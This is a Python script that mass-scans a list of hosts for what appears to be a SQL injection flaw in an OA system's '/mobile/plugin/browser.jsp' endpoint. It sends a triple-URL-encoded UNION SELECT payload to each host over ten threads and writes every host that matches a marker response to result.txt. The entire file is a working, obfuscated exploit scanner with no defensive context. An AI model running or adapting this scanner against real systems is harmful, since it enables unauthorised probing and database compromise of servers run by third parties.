# -*- coding: utf-8 -*-
import requests
import threadpool
import os
import urllib3

def exp(url):
    poc = "/mobile/%20/plugin/browser.jsp"
    url2 = url
    url = url + poc
    data = "isDis=1&browserTypeId=269&keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%32%25%33%37%25%32%35%25%33%35%25%33%33%25%32%35%25%33%35%25%33%31%25%32%35%25%33%34%25%36%33%25%32%35%25%33%35%25%36%36%25%32%35%25%33%34%25%33%35%25%32%35%25%33%35%25%33%38%25%32%35%25%33%34%25%33%39%25%32%35%25%33%35%25%33%33%25%32%35%25%33%35%25%33%34%25%32%35%25%33%35%25%33%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%37"
    host = url2.replace('https://', '').replace('http://', '')
    headers = {
        'Host': host,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': str(len(data))
    }
    try:
        urllib3.disable_warnings()
        res = requests.post(url, verify = False, headers=headers, data=data, timeout=3)
        if "autoCount" in res.text:
            print("[*]yesurl:" + url2)
            with open ("result.txt", 'a') as f:
                f.write(url2 + "\n")
    except:
        pass

def multithreading(funcname, params=[], filename="ip.txt", pools=10):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")] + params
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def main():
    if os.path.exists("result.txt"):
        f = open("result.txt", 'w')
        f.truncate()
    multithreading(exp, [], "ip.txt", 10)

if __name__ == '__main__':
    main()